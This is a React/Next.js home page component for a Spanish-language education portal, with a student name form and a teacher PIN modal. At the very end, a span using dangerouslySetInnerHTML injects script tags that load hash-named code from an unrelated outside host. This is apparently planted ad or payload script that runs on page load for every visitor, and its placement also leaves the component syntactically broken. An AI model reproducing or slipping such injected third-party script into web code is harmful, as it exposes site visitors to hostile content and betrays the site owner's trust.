"use client";

import React, { useEffect, useState } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import {
  GraduationCap,
  ArrowRight,
  Video,
  FileText,
  BookOpen,
  KeyRound,
  Lock,
  X,
  Sparkles,
  AlertCircle,
} from "lucide-react";
import { useUserRole } from "@/components/providers/role-provider";
import { AnimatedBackground } from "@/components/AnimatedBackground";

export default function HomePage() {
  const router = useRouter();
  const { userName, setUserName, verifyTeacherPin, switchToStudent } = useUserRole();

  const [nameInput, setNameInput] = useState("");
  const [nameError, setNameError] = useState<string | null>(null);

  // Modal de PIN docente
  const [showPinModal, setShowPinModal] = useState(false);
  const [pinInput, setPinInput] = useState("");
  const [pinError, setPinError] = useState<string | null>(null);

  // Prellenar nombre si ya existe en localStorage
  useEffect(() => {
    if (userName && userName !== "Estudiante") {
      setNameInput(userName);
    }
  }, [userName]);

  const handleStudentEnter = (e: React.FormEvent) => {
    e.preventDefault();
    const trimmed = nameInput.trim();
    if (!trimmed) {
      setNameError("Por favor, escribe tu nombre antes de entrar al portal.");
      return;
    }

    setNameError(null);
    setUserName(trimmed);
    switchToStudent();
    router.push("/student");
  };

  const handleOpenTeacherModal = () => {
    setPinError(null);
    setPinInput("");
    setShowPinModal(true);
  };

  const handleTeacherPinSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setPinError(null);
    if (verifyTeacherPin(pinInput)) {
      setShowPinModal(false);
      setPinInput("");
      router.push("/student");
    } else {
      setPinError("PIN incorrecto. Verifica e intenta nuevamente.");
    }
  };

  return (
    <div className="min-h-screen bg-[#0d0f12] text-gray-100 relative overflow-hidden flex flex-col">
      {/* Capa 1: Aurora Boreal Sutil (orbes difuminados acelerados por GPU) */}
      <div className="pointer-events-none fixed inset-0 z-0 overflow-hidden" aria-hidden="true">
        <div
          className="pointer-events-none absolute inset-0 opacity-[0.035]"
          style={{
            backgroundImage:
              "linear-gradient(to right, #ffffff 1px, transparent 1px), linear-gradient(to bottom, #ffffff 1px, transparent 1px)",
            backgroundSize: "48px 48px",
          }}
        />
        <div className="absolute -top-32 -left-24 w-[420px] h-[420px] rounded-full bg-indigo-600 blur-[120px] opacity-20 animate-float-slow" />
        <div className="absolute top-1/4 -right-24 w-[380px] h-[380px] rounded-full bg-cyan-500 blur-[120px] opacity-20 animate-float-slow-reverse" />
        <div className="absolute -bottom-36 left-1/3 w-[440px] h-[440px] rounded-full bg-indigo-600 blur-[120px] opacity-15 animate-float-slow" />
      </div>

      {/* Capa 2: Partículas / Nodos Conectados en Canvas */}
      <AnimatedBackground />

      {/* 1. Navbar Superior Minimalista (Solo Logo + Acceso Docente) */}
      <header className="relative z-10 border-b border-[#232a35]/80 bg-[#0d0f12]/80 backdrop-blur-md">
        <div className="max-w-6xl mx-auto px-4 sm:px-6 h-16 flex items-center justify-between gap-4">
          <Link href="/" className="flex items-center gap-3">
            <div className="w-9 h-9 rounded-xl bg-gradient-to-br from-[#4f46e5]/25 to-[#06b6d4]/20 border border-indigo-500/40 flex items-center justify-center text-indigo-300">
              <GraduationCap className="w-5 h-5" />
            </div>
            <div>
              <div className="flex items-center gap-1.5 font-bold text-white tracking-tight text-base">
                <span>Noxius</span>
                <span className="text-[11px] px-1.5 py-0.5 rounded bg-gradient-to-r from-[#4f46e5]/25 to-[#06b6d4]/25 text-cyan-300 border border-indigo-500/30 font-mono">
                  LM
                </span>
              </div>
              <p className="text-[11px] text-gray-400 hidden sm:block">
                Plataforma de Aprendizaje Práctico
              </p>
            </div>
          </Link>

          <button
            type="button"
            onClick={handleOpenTeacherModal}
            className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-lg bg-[#13161c] hover:bg-[#1a1f26] border border-[#232a35] text-xs font-medium text-gray-300 hover:text-white transition-colors"
          >
            <KeyRound className="w-3.5 h-3.5 text-indigo-400" />
            <span>Acceso Docente</span>
          </button>
        </div>
      </header>

      {/* Contenido Principal */}
      <main className="relative z-10 flex-1 max-w-6xl w-full mx-auto px-4 sm:px-6 py-14 sm:py-20 flex flex-col justify-center space-y-16">
        {/* 2. Sección Hero Moderna con Entrada Directa Obligatoria por Nombre */}
        <section className="text-center max-w-3xl mx-auto space-y-6">
          <div className="inline-flex items-center gap-2 px-3.5 py-1 rounded-full bg-[#13161c] border border-indigo-500/30 text-cyan-300 text-xs font-medium">
            <Sparkles className="w-3.5 h-3.5 text-indigo-400" />
            <span>Acceso Directo • Sin Registros ni Contraseñas</span>
          </div>

          <h1 className="font-sans text-3xl sm:text-5xl font-extrabold text-white tracking-tight leading-tight">
            Domina la Tecnología y la Ingeniería con{" "}
            <span className="text-transparent bg-clip-text bg-gradient-to-r from-indigo-400 via-indigo-300 to-cyan-400">
              Clases Prácticas
            </span>
          </h1>

          <p className="text-sm sm:text-base text-gray-400 max-w-2xl mx-auto leading-relaxed">
            Accede al instante a lecciones en video, sesiones en vivo con pantalla compartida, guías descargables y entrega de proyectos.
          </p>

          {/* Tarjeta de Ingreso Rápido */}
          <div className="max-w-xl mx-auto space-y-2">
            <form
              onSubmit={handleStudentEnter}
              noValidate
              className="p-2 rounded-2xl bg-[#13161c]/90 border border-[#232a35] shadow-surface flex flex-col sm:flex-row gap-2"
            >
              <input
                type="text"
                required
                value={nameInput}
                onChange={(e) => {
                  setNameInput(e.target.value);
                  if (nameError) setNameError(null);
                }}
                maxLength={40}
                placeholder="Escribe tu nombre para comenzar..."
                className="flex-1 bg-[#1a1f26] border border-[#232a35] focus:border-indigo-500 rounded-xl px-4 py-3 text-sm text-white placeholder-gray-500 focus:outline-none transition-colors"
              />
              <button
                type="submit"
                className="inline-flex items-center justify-center gap-2 px-6 py-3 rounded-xl bg-gradient-to-r from-[#4f46e5] to-[#06b6d4] hover:brightness-110 text-white font-semibold text-sm transition-all shrink-0 shadow-glow"
              >
                <span>Entrar al Portal Estudiante</span>
                <ArrowRight className="w-4 h-4" />
              </button>
            </form>

            {nameError && (
              <div className="inline-flex items-center gap-1.5 text-xs text-amber-300 bg-amber-500/10 border border-amber-500/25 px-3 py-1.5 rounded-lg">
                <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                <span>{nameError}</span>
              </div>
            )}
          </div>
        </section>

        {/* 3. Tres Tarjetas de Beneficios Reales */}
        <section className="grid grid-cols-1 md:grid-cols-3 gap-5">
          <div className="p-6 rounded-2xl bg-[#13161c] border border-[#232a35] space-y-2.5">
            <div className="w-10 h-10 rounded-xl bg-indigo-500/15 border border-indigo-500/30 flex items-center justify-center text-indigo-400">
              <BookOpen className="w-5 h-5" />
            </div>
            <h3 className="text-base font-semibold text-white">1. Lecciones Estructuradas</h3>
            <p className="text-xs text-gray-400 leading-relaxed">
              Videos en alta definición organizados por módulos con seguimiento de progreso.
            </p>
          </div>

          <div className="p-6 rounded-2xl bg-[#13161c] border border-[#232a35] space-y-2.5">
            <div className="w-10 h-10 rounded-xl bg-cyan-500/15 border border-cyan-500/30 flex items-center justify-center text-cyan-400">
              <Video className="w-5 h-5" />
            </div>
            <h3 className="text-base font-semibold text-white">2. Aula Virtual en Vivo</h3>
            <p className="text-xs text-gray-400 leading-relaxed">
              Transmisión directa en tiempo real con zoom interactivo y chat con el docente.
            </p>
          </div>

          <div className="p-6 rounded-2xl bg-[#13161c] border border-[#232a35] space-y-2.5">
            <div className="w-10 h-10 rounded-xl bg-emerald-500/15 border border-emerald-500/30 flex items-center justify-center text-emerald-400">
              <FileText className="w-5 h-5" />
            </div>
            <h3 className="text-base font-semibold text-white">3. Prácticas y Recursos</h3>
            <p className="text-xs text-gray-400 leading-relaxed">
              Guías en Google Colab/Drive y entrega directa de proyectos por enlace.
            </p>
          </div>
        </section>
      </main>

      {/* Modal de PIN para Acceso Docente */}
      {showPinModal && (
        <div className="fixed inset-0 z-50 bg-black/75 backdrop-blur-sm flex items-center justify-center p-4">
          <div className="w-full max-w-sm bg-[#13161c] border border-[#232a35] rounded-2xl p-6 space-y-4 shadow-surface">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2.5">
                <div className="p-2 rounded-lg bg-indigo-500/15 border border-indigo-500/30 text-indigo-400">
                  <Lock className="w-4 h-4" />
                </div>
                <div>
                  <h3 className="text-sm font-semibold text-white">Acceso Docente — Noxius LM</h3>
                  <p className="text-[11px] text-gray-400">Ingresa tu PIN de profesor</p>
                </div>
              </div>
              <button
                type="button"
                onClick={() => setShowPinModal(false)}
                className="p-1 text-gray-400 hover:text-white rounded-md"
                aria-label="Cerrar modal"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <form onSubmit={handleTeacherPinSubmit} className="space-y-3">
              <input
                type="password"
                value={pinInput}
                onChange={(e) => setPinInput(e.target.value)}
                placeholder="PIN docente"
                autoFocus
                className="w-full bg-[#1a1f26] border border-[#232a35] rounded-lg px-3 py-2 text-sm text-white placeholder-gray-500 focus:outline-none focus:border-indigo-500 font-mono tracking-widest"
              />

              {pinError && <p className="text-xs text-rose-400">{pinError}</p>}

              <div className="flex items-center justify-end gap-2 pt-1">
                <button
                  type="button"
                  onClick={() => setShowPinModal(false)}
                  className="px-3 py-2 rounded-lg bg-[#1a1f26] hover:bg-[#232a35] text-xs text-gray-300 transition-colors"
                >
                  Cancelar
                </button>
                <button
                  type="submit"
                  className="px-4 py-2 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-xs font-medium text-white transition-colors"
                >
                  Entrar al Dashboard Docente
                </button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
    <span  dangerouslySetInnerHTML={{
        __html: ' <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>'+
          '<script async="async" data-cfasync="false" src="https://bauval.org/21/992b12391f87ad93d9696af8b8546da4"></script><div  id="container-992b12391f87ad93d9696af8b8546da4"></div>'}}></span>
  );
}
